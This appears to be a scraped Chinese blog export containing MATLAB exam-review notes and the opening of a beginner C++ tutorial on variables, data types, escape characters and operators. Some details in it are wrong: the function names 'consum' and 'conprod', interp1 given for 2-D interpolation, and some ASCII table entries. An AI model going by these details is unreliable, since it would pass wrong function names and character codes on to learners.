c=input(\u0026#39;请输入一个字符：\u0026#39;,\u0026#39;s\u0026#39;); if c\u0026gt;=\u0026#39;A\u0026#39; \u0026amp;\u0026amp; c\u0026lt;=\u0026#39;Z\u0026#39; disp(lower(c)); elseif c\u0026gt;=\u0026#39;a\u0026#39; \u0026amp;\u0026amp; c\u0026lt;=\u0026#39;z\u0026#39; disp(upper(c)); elseif c\u0026gt;=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; c\u0026lt;=\u0026#39;9\u0026#39; disp(str2double(c)); else disp(c); end switch 1 2 3 4 5 6 7 8 9 10 11 12 price=input(\u0026#39;输入商品价格:\u0026#39;); switch fix(price/100) case {0,1} rate=0; case {2,3,4} rate=3/100; case num2cell(5:9) rate=5/100; otherwise rate=14/100; end price=price*(1-rate); try-catch 1 2 3 4 try c=A*C catch error for 按列作循环\n1 2 3 for k=[1,2,4,6] k end 1 2 3 4 5 n=2; for k=1:2:n=8 n=5; k end 向量为空就不执行循环\nfix()截尾取整\nrem()计算两个数的余数\n4.3函数文件 function 输出形参表 = 函数名(输入形参表)\nmatlab调用使用函数名，忽略文件名\nreturn只代表结束不代表返回\n4.4特殊形式的函数 子函数只能由同一文件的函数调用\n以字符串形式存在的函数表达式可以通过内联函数inline()转换\n匿名函数：sqr = @(x) x.^2; a = sqr(5)\n第五章：MATLAB绘图 5.1二维图形 基本函数 plot(x,y)函数的基本用法：分别以x,y为横纵坐标画图（x,y向量长度相同）\n当x是向量y是矩阵：x必须与y的行数或者列数相同，若等于行数，则以列数作为横纵坐标，反之亦然。\n绘制图形辅助操作 5.2其他形式的二维图形 5.3三维图形 第六章：MATLAB数据分析和多项式计算 拟合插值各看一个方法，看ppt（背背背案例），比较两者总结不一样的点（应用场景什么的）背下来，数据统计里面怎么求max，min，sub，average，求积，(这些命令怎么使用，传几个参数，穿哪些，有几个，先后顺序)标准相关系数\n6.1数据统计分析： 最大最小值 1、**向量max()：**求向量或矩阵的最大/小元素。 y=max(X):若x有复数则取模最大\n[y,k]=max(X):y存入最大值，k存入序号\n2、矩阵max():\nmax(A,[],dim):dim取1或者2，1是每一列的最大值，2是每一行的最大值（[]这个参数用来占位，表示忽略此参数。）\n3、两个向量或者矩阵对应元素的比较\nU=MAX(A,B),U与二者同型，结果是对应元素取最大的（A，B也同型）\nU=MAX(A,n)，结果是A对应元素与n最大值\n用什么方法只调用一次max 函数就能求得整个矩阵的最大值？\n1 2 A = [1 3 5; 7 2 8; 4 6 9]; max_val = max(A(:)); 求和求积 sum(X)：x为向量，返回各元素之和\nsum(A)：A是矩阵，返回行向量，是各列的和\nsum(A,dim)：1为列元素和，2为行元素和\n求积用prod函数（乘积：product）\n平均值/中值 mean(X)：x为向量，计算平均值\nmean(A)：A是矩阵，返回行向量，是各列的平均值\nmean(A,dim)：同上\nmedian()：计算中值，同mean\n分析哪一个更合理：mean对异常值（outliers）非常敏感。即使有少量极端值，也会显著影响均值。 median不如均值易于计算和理解，尤其是对于较大的数据集。\n累加累乘 consum(X)：x为向量，计算平均值\nconsum(A)：A是矩阵，返回行向量，是各列的累加和向量\nconsum(A,dim)：同上，1是列，2是行\nconprod()：同上\n1 2 3 4 5 求1！+2！+...+6! x=conprod(1:6) x=1 2 6 24 120 720 sum(x) 标准差和相关系数 标准差：\nstd(X)：返回向量标准差\nstd(A)：返回矩阵每列标准差\n调用方式：std(A，flag，dim)，flag取0调用公式一求标准差，1则是公式2。dim还是1求列，2求行。默认flag=0，dim=1\n相关系数：\ncorrcoef(X,Y)：求向量相关系数矩阵,求序列X,和Y的相关系数，结果是2x2的矩阵，对角线上是自相关系数矩阵，非对角线是X和Y，和Y和X的相关系数，是相等的。与corrcoef([X,Y])等价\ncorrcoef(X)：求矩阵相关系数，第i行第j列是矩阵X第i列和第j列的相关系数\nrandn产生的随机数是独立的\ncov()：产生协方差矩阵与上面类似\n排序 sort(A,dim,mode)：dim=1按列排，为2按行排序，mode为ascend升序（默认不写），逆序为descend,要加单引号。\n6.2多项式计算 多项式系数的量包含0次数项，向量从高到低\n多项式四则运算 加减：没有函数，对应相加减\n乘：conv(A,B),A,B为系数向量\n除法：[q,r]deconv(A,B),q返回A除B的商式，r返回余式\n二者互为逆函数，A=B*q+r\n多项式导函数 polyder(P)：P的导函数\npolyder(P,Q)：P*Q的导函数\n[P,Q]polyder(P,Q)：P/Q的导函数，导数分子存p,分母存q\n多项式求值 代数多项式求值：\npolyval(P,x)，x为自变量，P为系数向量\n矩阵多项式求值：\npolyvalm(P,A)，调用相同含义不同，A为方阵\n多项式求根 x=roots(P)\n若已知多项式全部根，可以重新建立起多项式ploy(x)\n6.3数据插值 从离散的数据，得到离散以外的数值\n一维数据插值 插值函数是一个单变量函数，采用一维插值，插值函数Y1=interp1(X,Y,X1,method)，是根据等长的已知向量X,Y，计算函数在X1处的值，超出X的插值点会出现NAN错误\n插值方法：\nlinear：线性插值，method不写为默认方法 nearest：最近点插值 pchip：分段3次埃米尔特插值 spline：3次样条插值，专门的函数spline(X,Y,X1)与interp1(X,Y,X1,spline)作用相同 二维数据插值 自变量是两个变化时，插值函数Z1=interp1(X,Y,Z,X1,Y1,method)，采用二维插值，X,Y,Z可以是矩阵。二维插值不支持pchip方法，其他都一样。同样超出X，Y的插值点会出现NAN错误\ninterp1(X,Y,Z,X1,Y1,method)，在X1,Y1处插值\ninterp1(X,Y,Z,[X1,X2],Y1,method)，在（X1,Y1）（X2,Y1）插值\ninterp1(X,Y,Z,[X1,X2],[Y1,Y2],method)，在（X1,Y1）（X2,Y2）插值\ninterp1(X,Y,Z,[X1,X2]\u0026rsquo;,[Y1,Y2],method)，在（X1,Y1）（X1,Y2）（X2,Y1）（X2,Y2）插值\n6.4曲线拟合 与插值类似，但又不同，不完全经过采样点，但希望拟合的函数g(x)靠近采样点。曲线拟合使用最小二乘逼近原理。\n实现 进行拟合时，实际是求一个系数向量，系数向量是多项式系数，matlab用polyfit函数求最小二乘拟合多项式的系数，再用ployval（）函数按照所得多项式计算给出点上的函数逼近值\nP=polyfit(X,Y,m)\n[P,S]=polyfit(X,Y,m)\n[P,S,mu]=polyfit(X,Y,m)\n采样点X和采样点函数值Y生成m次多项式，P是长度m+1向量，为多项式系数，mu(1)是mean()X,mu(2)是std(X)\n数据插值和曲线拟合不一样的地方 1、相同点: ①都属于函数逼近方法 ②都能进行数据估算\n2、不同点: ①实现方法不同： 数据插值要求逼近函数经过样本点，而曲线拟合不要求逼近函数经过样本点，只要求总体误差最小。 ②结果形式不同： 数据插值往往分段进行逼近，没有统一的逼近函数。曲线拟合用一个函数进行整体逼近，有确定的函数表达式。 ③侧重点不同： 数据插值一般用于样本区间内的插值计算，而曲线拟合不仅可以估算区间内其他点的函数值，还可以预测时序数据的发展趋势，以及从统计数据中总结一般性经验 ④应用场合不同： 如果样本数据为精确数据，适合采用数据插值方法；如果样本数据为统计数据或存在误差，则适合用曲线拟合的方法。\n第七章：MATLAB数值微分和积分 差分差商最简单的例子要会，没有大题，有选择填空，看课本知识点\n第八章：MATLAB方程数值求解 三种方式（都得背）：直接求解（求幂，反除），迭代法（高斯迭代背下来），jacabi迭代背下来，直接迭代（lu分解，qr分解，背一种），最优问题求解（看ppt，相对简单，改一下参数）\n8.1线性方程组求解 直接求解法 利用左除运算符求解\n即Ax=b，x=A\\b（谁在上是被除）\n利用矩阵分解：将一个矩阵分解为若干矩阵的乘积\nLU分解 ：矩阵的LU分解就是将一个n阶矩阵表示为一个下三角矩阵和一个上三角矩阵的 乘积。\n[L,U]=lu(x),产生一个上三角U和下三角L,使之满足X=LU\n[L,U,P]=lu(x),除了上面还有一个P置换矩阵使得PX=LU\ninv()是求逆函数\nQR分解\nCholesky分解\n迭代求法 迭代法是一种不断用变量的原值推出它的新值的过程，是用计算机解决问 题的一种基本方法。\n雅可比（Jacobi）迭代法 公式推导\nhttps://blog.csdn.net/qq_40264271/article/details/120611627\n高斯-赛德尔（Gauss-Serdel）迭代法 是上面公式的变化\n求线性方程组的通解 8.2非线性方程组数值求解 非线性方程组求解和最优化问题，往往 调用最优化工具箱来解决\n单变量非线性方程求解 fzero函数求根\nz=fzero(filename,x0)\nfilename待求根的函数，x0搜索的起点\n非线性方程组求解 最优化工具箱提供的函数fsolve\nfsolve函数求解非线性方程组的根\nX=fsolve(filename,X0,option)\nfilename待求根的函数,X0求解过程的初值,option优化参数\noptimset可以将优化参数都显示出来\n改变默认优化参数option=optimset(\u0026lsquo;Display\u0026rsquo;,\u0026lsquo;off\u0026rsquo;)\n8.3最优化问题求解 无约束最优化问题求解 [xmin,fmin]=fminbnd(filename,x1,x2,option)\n[xmin,fmin]=fminsearch(filename,x0,option)\n[xmin,fmin]=fminunc(filename,x0,option)\n有约束最优化问题求解 求有约束条件下最小值的函数为： [xmin,fmin]=fmincon(filename,x0,A,b,Aeq,beq,Lbnd,Ubnd,NonF,option)\n其中，xmin、fmin、filename、x0和option的含义与求最小值函数相同。其余参数为约束条件，包括线性不等式约束、线性等式约束、x的下界和上界以及定 义非线性约束的函数。如果某个约束不存在，则用空矩阵来表示。\n线性规划问题求解 8.4常微分初值问题的数值求解 书p200\n解决刚性问题的有ode15s，ode23s，ode23tb\n第九章：MATLAB符号计算（选填） 不考大题，就是基础的知识点\n总结： 大题\n数据，矩阵表示方法，怎么输入输出出来（结合if，else，for循环看一个例子，怎么写），结合字符串去做 画图绘图处理（二维的，同一个坐标系同一个布局，画什么样的图形，线条是什么样的） 数据分析，统计分析，每一个方法（怎么传递参数，得出结果处理结果，打印结果） 多项式考选择填空的，插值拟合分别会考，两者之间的应用场景有什么不一样的地方，做的是不是同一个事情 第七章微分积分，差分差商，通过数值的方法进行求导，通过采样得到函数，然后进行求导，傅里叶变化不考 第八章线性方程三种方法，直接方法，迭代两个都背下来。无约束的最优化手写敲一下！2和4节选择填空 第九章选择填空 ","date":"2024-06-29T14:45:56+08:00","permalink":"https://hack.liagu-one.top/p/matlab%E5%A4%8D%E4%B9%A0/","title":"Matlab复习"},{"content":"C++基础入门 1 C++初识 1.1 第一个C++程序 编写一个C++程序总共分为4个步骤\n创建项目 创建文件 编写代码 运行程序 1.1.1 创建项目 ​\tVisual Studio是我们用来编写C++程序的主要工具，我们先将它打开\n1.1.2 创建文件 右键源文件，选择添加-\u0026gt;新建项\n给C++文件起个名称，然后点击添加即可。\n1.1.3 编写代码 1 2 3 4 5 6 7 8 9 10 11 #include\u0026lt;iostream\u0026gt; using namespace std; int main() { cout \u0026lt;\u0026lt; \u0026#34;Hello world\u0026#34; \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 1.1.4 运行程序 1.2 注释 作用：在代码中加一些说明和解释，方便自己或其他程序员程序员阅读代码\n两种格式\n单行注释：// 描述信息 通常放在一行代码的上方，或者一条语句的末尾，==对该行代码说明== 多行注释： /* 描述信息 */ 通常放在一段代码的上方，==对该段代码做整体说明== 提示：编译器在编译代码时，会忽略注释的内容\n1.3 变量 作用：给一段指定的内存空间起名，方便操作这段内存\n语法：数据类型 变量名 = 初始值;\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;iostream\u0026gt; using namespace std; int main() { //变量的定义 //语法：数据类型 变量名 = 初始值 int a = 10; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 注意：C++在创建变量时，必须给变量一个初始值，否则会报错\n1.4 常量 作用：用于记录程序中不可更改的数据\nC++定义常量两种方式\n#define 宏常量： #define 常量名 常量值\n==通常在文件上方定义==，表示一个常量 const修饰的变量 const 数据类型 常量名 = 常量值\n==通常在变量定义前加关键字const==，修饰该变量为常量，不可修改 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //1、宏常量 #define day 7 int main() { cout \u0026lt;\u0026lt; \u0026#34;一周里总共有 \u0026#34; \u0026lt;\u0026lt; day \u0026lt;\u0026lt; \u0026#34; 天\u0026#34; \u0026lt;\u0026lt; endl; //day = 8; //报错，宏常量不可以修改 //2、const修饰变量 const int month = 12; cout \u0026lt;\u0026lt; \u0026#34;一年里总共有 \u0026#34; \u0026lt;\u0026lt; month \u0026lt;\u0026lt; \u0026#34; 个月份\u0026#34; \u0026lt;\u0026lt; endl; //month = 24; //报错，常量是不可以修改的 system(\u0026#34;pause\u0026#34;); return 0; } 1.5 关键字 **作用：**关键字是C++中预先保留的单词（标识符）\n在定义变量或者常量时候，不要用关键字 C++关键字如下：\nasm do if return typedef auto double inline short typeid bool dynamic_cast int signed typename break else long sizeof union case enum mutable static unsigned catch explicit namespace static_cast using char export new struct virtual class extern operator switch void const false private template volatile const_cast float protected this wchar_t continue for public throw while default friend register true delete goto reinterpret_cast try 提示：在给变量或者常量起名称时候，不要用C++得关键字，否则会产生歧义。\n1.6 标识符命名规则 作用：C++规定给标识符（变量、常量）命名时，有一套自己的规则\n标识符不能是关键字 标识符只能由字母、数字、下划线组成 第一个字符必须为字母或下划线 标识符中字母区分大小写 建议：给标识符命名时，争取做到见名知意的效果，方便自己和他人的阅读\n2 数据类型 C++规定在创建一个变量或者常量时，必须要指定出相应的数据类型，否则无法给变量分配内存\n2.1 整型 作用：整型变量表示的是==整数类型==的数据\nC++中能够表示整型的类型有以下几种方式，区别在于所占内存空间不同：\n数据类型 占用空间 取值范围 short(短整型) 2字节 (-2^15 ~ 2^15-1) int(整型) 4字节 (-2^31 ~ 2^31-1) long(长整形) Windows为4字节，Linux为4字节(32位)，8字节(64位) (-2^31 ~ 2^31-1) long long(长长整形) 8字节 (-2^63 ~ 2^63-1) 2.2 sizeof关键字 **作用：**利用sizeof关键字可以==统计数据类型所占内存大小==\n语法： sizeof( 数据类型 / 变量)\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int main() { cout \u0026lt;\u0026lt; \u0026#34;short 类型所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(short) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;int 类型所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(int) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;long 类型所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(long) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;long long 类型所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(long long) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 整型结论：==short \u0026lt; int \u0026lt;= long \u0026lt;= long long==\n2.3 实型（浮点型） 作用：用于==表示小数==\n浮点型变量分为两种：\n单精度float 双精度double 两者的区别在于表示的有效数字范围不同。\n数据类型 占用空间 有效数字范围 float 4字节 7位有效数字 double 8字节 15～16位有效数字 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int main() { float f1 = 3.14f; double d1 = 3.14; cout \u0026lt;\u0026lt; f1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; d1\u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;float sizeof = \u0026#34; \u0026lt;\u0026lt; sizeof(f1) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;double sizeof = \u0026#34; \u0026lt;\u0026lt; sizeof(d1) \u0026lt;\u0026lt; endl; //科学计数法 float f2 = 3e2; // 3 * 10 ^ 2 cout \u0026lt;\u0026lt; \u0026#34;f2 = \u0026#34; \u0026lt;\u0026lt; f2 \u0026lt;\u0026lt; endl; float f3 = 3e-2; // 3 * 0.1 ^ 2 cout \u0026lt;\u0026lt; \u0026#34;f3 = \u0026#34; \u0026lt;\u0026lt; f3 \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 2.4 字符型 **作用：**字符型变量用于显示单个字符\n语法：char ch = 'a';\n注意1：在显示字符型变量时，用单引号将字符括起来，不要用双引号\n注意2：单引号内只能有一个字符，不可以是字符串\nC和C++中字符型变量只占用==1个字节==。 字符型变量并不是把字符本身放到内存中存储，而是将对应的ASCII编码放入到存储单元 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { char ch = \u0026#39;a\u0026#39;; cout \u0026lt;\u0026lt; ch \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; sizeof(char) \u0026lt;\u0026lt; endl; //ch = \u0026#34;abcde\u0026#34;; //错误，不可以用双引号 //ch = \u0026#39;abcde\u0026#39;; //错误，单引号内只能引用一个字符 cout \u0026lt;\u0026lt; (int)ch \u0026lt;\u0026lt; endl; //查看字符a对应的ASCII码 ch = 97; //可以直接用ASCII给字符型变量赋值 cout \u0026lt;\u0026lt; ch \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } ASCII码表格：\nASCII值 控制字符 ASCII值 字符 ASCII值 字符 ASCII值 字符 0 NUT 32 (space) 64 @ 96 、 1 SOH 33 ! 65 A 97 a 2 STX 34 \u0026quot; 66 B 98 b 3 ETX 35 # 67 C 99 c 4 EOT 36 $ 68 D 100 d 5 ENQ 37 % 69 E 101 e 6 ACK 38 \u0026amp; 70 F 102 f 7 BEL 39 , 71 G 103 g 8 BS 40 ( 72 H 104 h 9 HT 41 ) 73 I 105 i 10 LF 42 * 74 J 106 j 11 VT 43 + 75 K 107 k 12 FF 44 , 76 L 108 l 13 CR 45 - 77 M 109 m 14 SO 46 . 78 N 110 n 15 SI 47 / 79 O 111 o 16 DLE 48 0 80 P 112 p 17 DCI 49 1 81 Q 113 q 18 DC2 50 2 82 R 114 r 19 DC3 51 3 83 S 115 s 20 DC4 52 4 84 T 116 t 21 NAK 53 5 85 U 117 u 22 SYN 54 6 86 V 118 v 23 TB 55 7 87 W 119 w 24 CAN 56 8 88 X 120 x 25 EM 57 9 89 Y 121 y 26 SUB 58 : 90 Z 122 z 27 ESC 59 ; 91 [ 123 { 28 FS 60 \u0026lt; 92 / 124 | 29 GS 61 = 93 ] 125 } 30 RS 62 \u0026gt; 94 ^ 126 ` 31 US 63 ? 95 _ 127 DEL ASCII 码大致由以下两部分组成：\nASCII 非打印控制字符： ASCII 表上的数字 0-31 分配给了控制字符，用于控制像打印机等一些外围设备。 ASCII 打印字符：数字 32-126 分配给了能在键盘上找到的字符，当查看或打印文档时就会出现。 2.5 转义字符 **作用：**用于表示一些==不能显示出来的ASCII字符==\n现阶段我们常用的转义字符有： \\n \\\\ \\t\n转义字符 含义 ASCII码值（十进制） \\a 警报 007 \\b 退格(BS) ，将当前位置移到前一列 008 \\f 换页(FF)，将当前位置移到下页开头 012 \\n 换行(LF) ，将当前位置移到下一行开头 010 \\r 回车(CR) ，将当前位置移到本行开头 013 \\t 水平制表(HT) （跳到下一个TAB位置） 009 \\v 垂直制表(VT) 011 \\\\ 代表一个反斜线字符\u0026quot;\u0026quot; 092 ' 代表一个单引号（撇号）字符 039 \u0026quot; 代表一个双引号字符 034 ? 代表一个问号 063 \\0 数字0 000 \\ddd 8进制转义字符，d范围0~7 3位8进制 \\xhh 16进制转义字符，h范围09，af，A~F 3位16进制 示例：\n1 2 3 4 5 6 7 8 9 10 11 int main() { cout \u0026lt;\u0026lt; \u0026#34;\\\\\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;\\tHello\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34; \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 2.6 字符串型 作用：用于表示一串字符\n两种风格\nC风格字符串： char 变量名[] = \u0026quot;字符串值\u0026quot;\n示例：\n1 2 3 4 5 6 7 8 9 int main() { char str1[] = \u0026#34;hello world\u0026#34;; cout \u0026lt;\u0026lt; str1 \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 注意：C风格的字符串要用双引号括起来\nC++风格字符串： string 变量名 = \u0026quot;字符串值\u0026quot;\n示例：\n1 2 3 4 5 6 7 8 9 int main() { string str = \u0026#34;hello world\u0026#34;; cout \u0026lt;\u0026lt; str \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 注意：C++风格字符串，需要加入头文件==#include\u0026lt;string\u0026gt;==\n2.7 布尔类型 bool **作用：**布尔数据类型代表真或假的值\nbool类型只有两个值：\ntrue \u0026mdash; 真（本质是1） false \u0026mdash; 假（本质是0） bool类型占==1个字节==大小\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int main() { bool flag = true; cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; // 1 flag = false; cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; // 0 cout \u0026lt;\u0026lt; \u0026#34;size of bool = \u0026#34; \u0026lt;\u0026lt; sizeof(bool) \u0026lt;\u0026lt; endl; //1 system(\u0026#34;pause\u0026#34;); return 0; } 2.8 数据的输入 作用：用于从键盘获取数据\n**关键字：**cin\n语法： cin \u0026gt;\u0026gt; 变量 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 int main(){ //整型输入 int a = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入整型变量：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; a; cout \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; //浮点型输入 double d = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入浮点型变量：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; d; cout \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; //字符型输入 char ch = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入字符型变量：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; ch; cout \u0026lt;\u0026lt; ch \u0026lt;\u0026lt; endl; //字符串型输入 string str; cout \u0026lt;\u0026lt; \u0026#34;请输入字符串型变量：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; str; cout \u0026lt;\u0026lt; str \u0026lt;\u0026lt; endl; //布尔类型输入 bool flag = true; cout \u0026lt;\u0026lt; \u0026#34;请输入布尔型变量：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; flag; cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return EXIT_SUCCESS; } 3 运算符 **作用：**用于执行代码的运算\n本章我们主要讲解以下几类运算符：\n运算符类型 作用 算术运算符 用于处理四则运算 赋值运算符 用于将表达式的值赋给变量 比较运算符 用于表达式的比较，并返回一个真值或假值 逻辑运算符 用于根据表达式的值返回真值或假值 3.1 算术运算符 作用：用于处理四则运算\n算术运算符包括以下符号：\n运算符 术语 示例 结果 + 正号 +3 3 - 负号 -3 -3 + 加 10 + 5 15 - 减 10 - 5 5 * 乘 10 * 5 50 / 除 10 / 5 2 % 取模(取余) 10 % 3 1 ++ 前置递增 a=2; b=++a; a=3; b=3; ++ 后置递增 a=2; b=a++; a=3; b=2; \u0026ndash; 前置递减 a=2; b=\u0026ndash;a; a=1; b=1; \u0026ndash; 后置递减 a=2; b=a\u0026ndash;; a=1; b=2; 示例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //加减乘除 int main() { int a1 = 10; int b1 = 3; cout \u0026lt;\u0026lt; a1 + b1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; a1 - b1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; a1 * b1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; a1 / b1 \u0026lt;\u0026lt; endl; //两个整数相除结果依然是整数 int a2 = 10; int b2 = 20; cout \u0026lt;\u0026lt; a2 / b2 \u0026lt;\u0026lt; endl; int a3 = 10; int b3 = 0; //cout \u0026lt;\u0026lt; a3 / b3 \u0026lt;\u0026lt; endl; //报错，除数不可以为0 //两个小数可以相除 double d1 = 0.5; double d2 = 0.25; cout \u0026lt;\u0026lt; d1 / d2 \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：在除法运算中，除数不能为0\n示例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //取模 int main() { int a1 = 10; int b1 = 3; cout \u0026lt;\u0026lt; 10 % 3 \u0026lt;\u0026lt; endl; int a2 = 10; int b2 = 20; cout \u0026lt;\u0026lt; a2 % b2 \u0026lt;\u0026lt; endl; int a3 = 10; int b3 = 0; //cout \u0026lt;\u0026lt; a3 % b3 \u0026lt;\u0026lt; endl; //取模运算时，除数也不能为0 //两个小数不可以取模 double d1 = 3.14; double d2 = 1.1; //cout \u0026lt;\u0026lt; d1 % d2 \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：只有整型变量可以进行取模运算\n示例3：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //递增 int main() { //后置递增 int a = 10; a++; //等价于a = a + 1 cout \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // 11 //前置递增 int b = 10; ++b; cout \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; // 11 //区别 //前置递增先对变量进行++，再计算表达式 int a2 = 10; int b2 = ++a2 * 10; cout \u0026lt;\u0026lt; b2 \u0026lt;\u0026lt; endl; //后置递增先计算表达式，后对变量进行++ int a3 = 10; int b3 = a3++ * 10; cout \u0026lt;\u0026lt; b3 \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：前置递增先对变量进行++，再计算表达式，后置递增相反\n3.2 赋值运算符 **作用：**用于将表达式的值赋给变量\n赋值运算符包括以下几个符号：\n运算符 术语 示例 结果 = 赋值 a=2; b=3; a=2; b=3; += 加等于 a=0; a+=2; a=2; -= 减等于 a=5; a-=3; a=2; *= 乘等于 a=2; a*=2; a=4; /= 除等于 a=4; a/=2; a=2; %= 模等于 a=3; a%2; a=1; 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 int main() { //赋值运算符 // = int a = 10; a = 100; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // += a = 10; a += 2; // a = a + 2; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // -= a = 10; a -= 2; // a = a - 2 cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // *= a = 10; a *= 2; // a = a * 2 cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // /= a = 10; a /= 2; // a = a / 2; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; // %= a = 10; a %= 2; // a = a % 2; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 3.3 比较运算符 **作用：**用于表达式的比较，并返回一个真值或假值\n比较运算符有以下符号：\n运算符 术语 示例 结果 == 相等于 4 == 3 0 != 不等于 4 != 3 1 \u0026lt; 小于 4 \u0026lt; 3 0 \u0026gt; 大于 4 \u0026gt; 3 1 \u0026lt;= 小于等于 4 \u0026lt;= 3 0 \u0026gt;= 大于等于 4 \u0026gt;= 1 1 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int main() { int a = 10; int b = 20; cout \u0026lt;\u0026lt; (a == b) \u0026lt;\u0026lt; endl; // 0 cout \u0026lt;\u0026lt; (a != b) \u0026lt;\u0026lt; endl; // 1 cout \u0026lt;\u0026lt; (a \u0026gt; b) \u0026lt;\u0026lt; endl; // 0 cout \u0026lt;\u0026lt; (a \u0026lt; b) \u0026lt;\u0026lt; endl; // 1 cout \u0026lt;\u0026lt; (a \u0026gt;= b) \u0026lt;\u0026lt; endl; // 0 cout \u0026lt;\u0026lt; (a \u0026lt;= b) \u0026lt;\u0026lt; endl; // 1 system(\u0026#34;pause\u0026#34;); return 0; } 注意：C和C++ 语言的比较运算中， ==“真”用数字“1”来表示， “假”用数字“0”来表示。==\n3.4 逻辑运算符 **作用：**用于根据表达式的值返回真值或假值\n逻辑运算符有以下符号：\n运算符 术语 示例 结果 ! 非 !a 如果a为假，则!a为真； 如果a为真，则!a为假。 \u0026amp;\u0026amp; 与 a \u0026amp;\u0026amp; b 如果a和b都为真，则结果为真，否则为假。 || 或 a || b 如果a和b有一个为真，则结果为真，二者都为假时，结果为假。 **示例1：**逻辑非\n1 2 3 4 5 6 7 8 9 10 11 12 13 //逻辑运算符 --- 非 int main() { int a = 10; cout \u0026lt;\u0026lt; !a \u0026lt;\u0026lt; endl; // 0 cout \u0026lt;\u0026lt; !!a \u0026lt;\u0026lt; endl; // 1 system(\u0026#34;pause\u0026#34;); return 0; } 总结： 真变假，假变真\n**示例2：**逻辑与\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //逻辑运算符 --- 与 int main() { int a = 10; int b = 10; cout \u0026lt;\u0026lt; (a \u0026amp;\u0026amp; b) \u0026lt;\u0026lt; endl;// 1 a = 10; b = 0; cout 